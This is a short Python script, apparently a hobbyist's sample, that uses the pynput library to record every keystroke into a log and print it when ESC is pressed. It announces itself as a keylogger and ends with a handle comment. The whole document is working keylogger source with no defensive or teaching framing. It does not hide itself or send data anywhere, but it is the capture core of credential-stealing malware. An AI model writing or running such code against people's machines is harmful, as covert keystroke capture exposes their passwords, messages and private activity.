from pynput import keyboard

log = ""

def on_press(key):
    global log
    try:
        log += key.char  
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "  
        else:
            log += f" [{key.name}] " 

def on_release(key):
    if key == keyboard.Key.esc:
        print("[+] Exiting...")
        print("[+] Final Log:", log)
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("[+] Keylogger running... Press ESC to stop.")
    listener.join()


#ph1n3y
